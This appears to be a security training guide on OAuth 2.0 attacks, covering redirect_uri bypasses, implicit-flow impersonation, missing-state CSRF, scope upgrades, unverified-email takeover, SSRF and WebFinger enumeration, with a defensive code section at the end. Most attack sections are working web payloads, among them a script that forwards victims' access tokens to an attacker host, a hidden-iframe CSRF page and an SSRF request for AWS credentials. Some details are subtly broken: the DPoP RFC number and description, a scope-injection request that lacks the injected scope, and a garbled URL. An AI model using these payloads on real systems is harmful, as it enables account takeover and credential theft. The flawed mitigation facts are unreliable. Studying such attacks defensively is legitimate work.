#  OAuth 2.0 Architectural & Implementation Flaws

**Category**: Client-Side Application Logic and Service Configurations  
**Severity Focus**: High to Critical (Potential for Full Account Takeover & Token Theft)

---

## 1. Client-Side Application Vulnerabilities

### Module 01: Token Exfiltration via Broken Whitelist Validation & Open Redirects
*   **CWE Mapping**: CWE-601 (Open Redirect), CWE-20 (Improper Input Validation)
*   **OWASP Top 10 Reference**: A01:2021-Broken Access Control

---

##  What is OAuth 2.0?

**OAuth 2.0 (Open Authorization)** is an industry-standard delegation framework that allows a third-party website or client application to access restricted user resources on another service (the Identity Provider or IdP) without exposing the user's actual login credentials or password. 

Instead of credentials, OAuth relies on a system of short-lived **access tokens** issued via cryptographic handshakes. The protocol is inherently complex and loosely defined, leaving significant room for implementation logic flaws and misconfigurations on both the client application side and the central authentication service layer.

---

### Key OAuth Flow Types (Study Note)
| Flow Type | Token Location | Security | Recommended For |
|-----------|----------------|----------|-----------------|
| Authorization Code | Backend (HTTP body) | High | Server-side apps |
| Authorization Code + PKCE | Browser (with challenge) | High | SPAs (modern) |
| Implicit | Browser (fragment) | Low | **DEPRECATED** |
| Client Credentials | Backend | High | Machine-to-machine |

---


#### Low-Level Architectural Mechanics
The vulnerability relies on a weak string-matching logic on the Authorization Server or client redirect validation. Instead of validating the exact `redirect_uri` string, the server only checks if the incoming path **starts with** an allowed prefix. 

By design, during an OAuth **Implicit Grant Flow** (`response_type=token`), the authorization token is appended to the redirect URL inside a fragment identifier (`#access_token=...`). Unlike query parameters (`?`), URL fragments are **NOT sent to the server** but are accessible to client-side JavaScript. This creates a client-side exfiltration vector when combined with open redirect bugs.

**Important Technical Correction**: Modern browsers (Chrome, Firefox, Safari) **DO NOT preserve fragments across server-side 302 redirects**. The attack works via **client-side redirect chain** (`window.location`), not server-side redirects.

The attacker exploits:
1. Authorization Server accepts `redirect_uri` with path traversal
2. Browser normalizes the path (removes `/../`)
3. Client application has an open redirect at `/post/next?path=...`
4. Token in fragment is passed to the open redirect endpoint
5. Client-side JS extracts fragment and redirects to attacker

#### Typology A: Path Traversal Whitelist Bypass (`/../`)
*   **Allowed Path**: `https://vulnerable-client.com`
*   **Target Open Redirect Endpoint**: `https://vulnerable-client.com/...`

#### 🎯 Raw Injection Payload
```text
/oauth-callback/../post/next?path=https://attacker-exploit.net
```

#### 🌐 Full Intercepted Bait URL (Sent to Victim)
```text
https://oauth-server.com/auth?client_id=client_prod_99&redirect_uri=https://vulnerable-client.com/../post/next?path=https://attacker-exploit.net&response_type=token&nonce=1337&scope=openid%20profile%20email
```

#### Typology B: Parameter Confusion / Pollution
*   **Scenario**: The backend infrastructure parses duplicate query keys loosely, prioritizing the last occurrence.

#### 🎯 Raw Injection Payload
```text
&redirect_uri=https://attacker-exploit.net
```

#### 🌐 Full Intercepted Bait URL (Sent to Victim)
```text
https://oauth-server.com/auth?client_id=client_prod_99&redirect_uri=https://vulnerable-client.comcallback&redirect_uri=https://attacker-exploit.net&response_type=token&scope=openid
```

#### Attacker Infrastructure Script (`/exploit`)
This dual-action script runs on the exploit server. It handles two distinct page visits from the victim's browser using a conditional loop:

```html
<script>
if (!document.location.hash) {
    /* PHASE 1: First Visit (No Hash Present)
       The victim arrives clean. The script forcefully triggers the malicious 
       OAuth redirection chain using the Path Traversal bypass. */
    window.location = 'https://oauth-server.com/auth?client_id=client_prod_99&redirect_uri=https://vulnerable-client.com/../post/next?path=https://attacker-exploit.net&response_type=token&nonce=1337&scope=openid%20profile%20email';
} else {
    /* PHASE 2: Return Visit (Hash Token Present)
       The victim bounces back from the client's open redirect with the token.
       The script strips the '#' and appends the token into a query string ('/?') 
       to drop it directly into the attacker's HTTP access logs. */
    window.location = '/?' + document.location.hash.substr(1);
}
</script>
```

#### 📄 Exfiltration Proof (The Attacker Access Log View)
```text
192.168.1.45 - - [19/Jun/2026:23:14:02 +0000] "GET /?access_token=eyJhbGciOiJSUzI1NiIsImtpZCI6...&expires_in=3600 HTTP/1.1" 200 404 "https://vulnerable-client.com"
```

#### Modern Mitigation: PKCE (Proof Key for Code Exchange)
- **Purpose**: Prevents authorization code interception attacks for SPAs
- **Mechanism**: Client generates `code_challenge` (SHA256 hash) and `code_verifier` (random string)
- **Flow**:
  1. Client sends `code_challenge` during authorization request (`response_type=code`)
  2. Authorization server stores challenge
  3. At `/token` exchange, client sends `code_verifier`
  4. Server validates verifier hash matches stored challenge
- **Effect**: Attacker cannot use intercepted authorization code without original `code_verifier`

---

### Module 02: Authentication Bypass via Improper Implicit Grant Implementation
*   **CWE Mapping**: CWE-287 (Improper Authentication), CWE-565 (Reliance on Public Info)
*   **OWASP Top 10 Reference**: A07:2021-Identification and Authentication Failures

#### Low-Level Architectural Mechanics
When a classic client-server application implements the Implicit Flow for simplicity, it extracts user data via JavaScript on the frontend. To keep the user logged in, it submits this profile data to its backend via a POST request and receives a session cookie. 

The security boundary completely breaks here because the backend has no secrets or passwords to cross-examine. It implicitly trusts whatever data the browser self-reports, creating a direct impersonation vector.

#### 🌐 Intercepted Baseline Request (`POST /authenticate`)
```http
POST /authenticate HTTP/1.1
Host: vulnerable-client.com
Content-Type: application/json;charset=UTF-8

{
  "email": "wiener@normal-user.net",
  "username": "wiener",
  "token": "eyJhbGciOiJSUzI1NiIsImtpZCI6..."
}
```

#### 🎯 Malicious Injection Payload (Modifying JSON Body)
Capture the request in Burp Suite and exchange the target identity strings:
```http
POST /authenticate HTTP/1.1
Host: vulnerable-client.com
Content-Type: application/json;charset=UTF-8

{
  "email": "carlos@dontwebauth.net",
  "username": "carlos",
  "token": "eyJhbGciOiJSUzI1NiIsImtpZCI6..."
}
```

#### 📄 Demo Server Response (Successful Hijack)
```http
HTTP/1.1 302 Found
Location: /my-account
Set-Cookie: session=M0ckU3VyZVNlc3Npb25Db29raWU...; Secure; HttpOnly; SameSite=None
Content-Length: 0
Connection: close
```
*   **Result**: The server processes the request, fails to check if the attached token actually belongs to `carlos`, and returns a `302 Found` response assigning an authenticated session cookie belonging directly to the victim.

#### Backend Should Verify These JWT Claims:
- Token **signature** (JWT cryptographic verification)
- `iss` (issuer) matches expected IdP
- `aud` (audience) matches your app client ID
- `exp` (expiration) not expired
- `sub` (subject) matches submitted user ID
- `email_verified` = true (if using email for account mapping)

---

### Module 03: Flawed CSRF Protection (Missing or Weak `state`)
*   **CWE Mapping**: CWE-352 (Cross-Site Request Forgery)
*   **OWASP Top 10 Reference**: A01:2021-Broken Access Control

#### Low-Level Architectural Mechanics
If an application allows users to link their social media profiles to an existing account but omits the unguessable cryptographically secure `state` parameter, the entire flow becomes vulnerable to CSRF. An attacker can tie their own social profile to a victim's account session.

#### 🎯 Exploit Delivery via Hidden Iframe (The CSRF Attack Structure)
Attackers host this payload on an external server and trick the logged-in victim into visiting it to force an account binding in the background:

```html
<!-- The victim views this harmless page while their browser executes the attack inside a hidden box -->
<h1>Loading Profile Assets... Please wait.</h1>

<iframe src="https://vulnerable-client.com?code=ATTACKER_VALID_AUTH_CODE" style="display:none;"></iframe>
```

#### 🌐 Full Intercepted Attack URL (Executed inside Iframe)
```text
https://vulnerable-client.com?code=7a5b3c2e1f9g8h7i6j5k
```

#### 📄 Demo Server Response (To the Victim's Browser)
```http
HTTP/1.1 302 Found
Location: /account-settings
Set-Cookie: notification=social_profile_linked_successfully; Path=/
Connection: close
```
*   **Result**: When the logged-in victim loads this HTML, their browser triggers the attacker's authorization code against the client backend. Because no unique session `state` token is cross-checked, the client backend binds the attacker's social media identity to the victim's profile account.

**Note**: For SPAs, PKCE provides similar CSRF protection without requiring server-side state storage.

---

## 🔬 2. OAuth Service Provider Vulnerabilities

### Module 04: Account Hijacking via Loose `redirect_uri` Validation
*   **CWE Mapping**: CWE-20 (Improper Input Validation)
*   **OWASP Top 10 Reference**: A01:2021-Broken Access Control

#### Low-Level Architectural Mechanics
Unlike Module 01, this applies when the OAuth server performs zero path verification and accepts an attacker-controlled external domain as a legitimate callback target directly inside the initial handshake configuration.

#### 🎯 Raw Injection Payload
```text
redirect_uri=https://attacker-exploit.net
```

#### 🌐 Full Intercepted Bait URL (Direct Theft Link)
```text
https://oauth-server.com/auth?client_id=client_prod_99&redirect_uri=https://attacker-exploit.net&response_type=code&scope=openid
```

#### 📄 Demo Server Response (Redirecting Token Directly to Attacker)
```http
HTTP/1.1 302 Found
Location: https://attacker-exploit.net?code=v1kt1m_53cr37_c0d3_991
Connection: close
```
*   **Result**: The attacker hosts a link or sets an iframe to trigger this URL on the victim's browser. The OAuth provider generates an authorization code and sends it straight to the attacker's server callback logs without requiring any bugs on the client application site.

---

### Module 05: Flawed Scope Validation & Token Privilege Escalation
*   **CWE Mapping**: CWE-20, CWE-287
*   **OWASP Top 10 Reference**: A01:2021-Broken Access Control

#### Typology A: Authorization Code Scope Upgrade
Occurs when an attacker registers an application with the OAuth service and requests a low-risk scope (e.g., `email`). Once the victim approves the consent screen, the attacker intercepts the code/token exchange request at the `/token` phase and appends unauthorized scopes.

#### 🎯 Raw Injection Payload
```text
&scope=openid%20email%20profile%20admin_access
```

#### 🌐 The Injected Exploitation Request (`POST /token`)
```http
POST /token HTTP/1.1
Host: oauth-authorization-server.com
Content-Type: application/x-www-form-urlencoded

client_id=12345&client_secret=SECRET&redirect_uri=https://attacker-app.com
```

#### 📄 Demo Server Response (Privileged Token Issuance)
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "access_token": "upgraded_high_privilege_bearer_token",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "openid email profile admin_access"
}
```

> **Why it breaks**: If the authorization server fails to match the `/token` scope parameter against the scope registered during the initial code generation phase, it mints an upgraded token containing administrative privileges.

#### Typology B: Implicit Flow Scope Upgrade
If an attacker steals an active low-privilege token, they can query the provider's resource endpoint (`/userinfo`) while manually injecting an expanded scope key into the query parameters.

#### 🌐 Full Intercepted URL Request (API Parameter Tampering)
```http
GET /userinfo?scope=openid%20profile%20email%20extended_permissions HTTP/1.1
Host: oauth-service-provider.com
Authorization: Bearer STOLEN_LOW_PRIVILEGE_TOKEN
Connection: close
```

#### Mitigation: Refresh Token Rotation
- **What**: Each refresh token use issues NEW refresh token
- **Old token**: Immediately invalidated
- **Effect**: If attacker steals refresh token, legitimate user's next use detects reuse → both tokens invalidated

---

### Module 06: Unverified User Registration
*   **CWE Mapping**: CWE-287 (Improper Authentication)
*   **OWASP Top 10 Reference**: A07:2021-Identification and Authentication Failures

#### Low-Level Architectural Mechanics
This occurs when a client application delegates authentication to an identity provider (IdP) but assumes that all profile attributes are verified. If the IdP allows users to sign up and interact before validating their inbox, an attacker can build an unverified profile using a victim's email handle.

#### 🎯 Raw Fraudulent Identity Response Body (The ID Token Claims)
The attacker initiates login via the unverified account. The client backend decodes this token:
```json
{
  "iss": "https://weak-identity-provider.com",
  "sub": "user_id_attacker_controlled_999",
  "email": "target_victim@corporate-domain.com",
  "email_verified": false
}
```

#### 🌐 Full Intercepted URL Request (The Backend Authentication Call)
```http
POST /oauth-login-callback HTTP/1.1
Host: trusted-client-app.com
Content-Type: application/json

{
  "provider": "weak-identity-provider",
  "id_token": "eyJhbGciOiJSUzI1NiIsImtpZCI6...[Claims: email=target_victim@corporate-domain.com]"
}
```

#### 📄 Demo Server Response (Account Hijack Granted)
```http
HTTP/1.1 200 OK
Set-Cookie: session=VictimAccountSessionCookieCreated; HttpOnly; Secure
Content-Type: text/html

<h1>Welcome back, Executive Administrator!</h1>
```

> **Why it breaks**: The client application backend parses the token, identifies the matching `email` field string in its database, and grants complete session control to the attacker while failing to process or reject based on the `"email_verified": false` validation flag.

**Critical**: Map accounts by `iss` + `sub` (immutable), NOT by mutable `email`.

---

### Module 07: SSRF via OpenID Dynamic Client Registration
*   **CWE Mapping**: CWE-918 (Server-Side Request Forgery)
*   **OWASP Top 10 Reference**: A10:2021-Server-Side Request Forgery

#### Low-Level Architectural Mechanics
OpenID Connect specifications allow dynamic client registration via a dedicated endpoint (typically `/register`). When client applications register themselves, they submit configuration parameters. If the OAuth service handles metadata URIs (like `logo_uri`) unsafely, it initiates an internal backend fetch request, creating an SSRF vector.

#### 🎯 Exploitation Injection Payload
```json
"logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

#### 🌐 Full Intercepted Registration Request (`POST /register`)
```http
POST /openid/register HTTP/1.1
Host: oauth-service-provider.com
Content-Type: application/json

{
    "client_name": "Exploit App",
    "redirect_uris": ["https://attacker.net"],
    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
```

#### 📄 Demo Server Response (Exfiltrating AWS Cloud Metadata)
```http
HTTP/1.1 201 Created
Content-Type: application/json

{
    "client_id": "dyn_client_84729",
    "client_name": "Exploit App",
    "logo_uri": "{\n  \"Code\" : \"Success\",\n  \"LastUpdated\" : \"2026-06-19T23:30:00Z\",\n  \"Type\" : \"AWS-HMAC\",\n  \"AccessKeyId\" : \"AKIAIOSFODNN7EXAMPLE\",\n  \"SecretAccessKey\" : \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\"\n}"
}
```

> **Result**: The OAuth server reads the registration, creates the profile, and executes an out-of-band HTTP GET request to fetch the resource at the specified `logo_uri`. It reads the raw AWS IAM responses containing cloud security access keys and leaks them back to the attacker inside the application configuration response payload.

---

### Module 08: OpenID Connect WebFinger User Enumeration
*   **CWE Mapping**: CWE-200 (Information Disclosure)
*   **OWASP Top 10 Reference**: A01:2021-Broken Access Control

#### Low-Level Architectural Mechanics
OpenID Connect servers often expose a standard resource discovery endpoint (`/.well-known/webfinger`). This route is designed to let clients query whether a specific user identifier exists on the Identity Provider cluster. If poorly structured, it leaks valid email formats and user existences to unauthenticated attackers.

#### 🎯 Raw Injection Payload
```text
?resource=acct:carlos@target-company.com
```

#### 🌐 Discovery Request Injection
An attacker parameterizes automated checks against the target OIDC router:
```http
GET /.well-known/webfinger?resource=acct:carlos@target-company.com HTTP/1.1
Host: vulnerable-oauth-provider.com
```

#### 📄 Demo Server Response (Leaking Valid Account Presence)
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
    "subject": "acct:carlos@target-company.com",
    "links": [
        {
            "rel": "http://openid.net",
            "href": "https://vulnerable-oauth-provider.com"
        }
    ]
}
```

> **Vulnerable Response Status**: The server answers with an HTTP `200 OK` and a structured profile schema for valid accounts but returns an HTTP `404 Not Found` for invalid inputs, creating a reliable method for targeting system user handles.

---

## 🛡️ OAuth Defensive Coding Blueprint

```python
import jwt
import requests
from flask import abort, session, request

# 1. Enforce strict exact-string validation lists
WHITELISTED_CALLBACKS = ["https://trusted-client.com"]

def validate_redirect(uri):
    if uri not in WHITELISTED_CALLBACKS:
        return abort(400, "Invalid Redirect URI")

# 2. Secure Server-Side Identity Verification & Scope Cross-Check
@app.route('/oauth-login-callback', methods=['POST'])
def secure_login():
    payload = request.get_json()
    id_token = payload.get('token')
    
    try:
        # Cryptographically decode and verify public JWKS key signatures
        decoded_claims = jwt.decode(id_token, PROVIDER_PUBLIC_KEY, algorithms=["RS256"], audience="our_app")
        
        # 3. Validate ALL JWT claims (not just email_verified)
        required_claims = {
            'iss': 'https://expected-idp.com',
            'aud': 'your-app-client-id',
            'exp': None,  # Will be validated by jwt.decode
        }
        
        for claim, expected in required_claims.items():
            if expected and decoded_claims.get(claim) != expected:
                return abort(401, f"Invalid {claim} claim")
        
        # Enforce Email Verification Checks
        if not decoded_claims.get('email_verified', False):
            return abort(401, "Unverified Identity Claims Blocked")
            
        # 4. Bind session to token's sub (immutable), not email (mutable)
        session['user_sub'] = decoded_claims.get('sub')
        session['user_email'] = decoded_claims.get('email')
        return "Authenticated", 200
        
    except jwt.exceptions.InvalidTokenError:
        return abort(401, "Signature Verification Failure")
```

### Additional Mitigations: Token Binding / DPoP

**DPoP (RFC 9434)**: Demonstrating Proof of Possession
- Tokens bound to specific TLS client certificate
- Attacker cannot use stolen token without original client's certificate

**mTLS**: Mutual TLS binds token to client certificate

### Monitoring for OAuth Attacks
- **Log**: All redirect_uri parameters (detect open redirect attempts)
- **Alert**: Multiple different redirect_uris from same client_id
- **Alert**: Sudden scope changes in /token requests
- **Alert**: High failure rate on JWT signature verification
- **Alert**: WebFinger endpoint called >100 times/hour from same IP
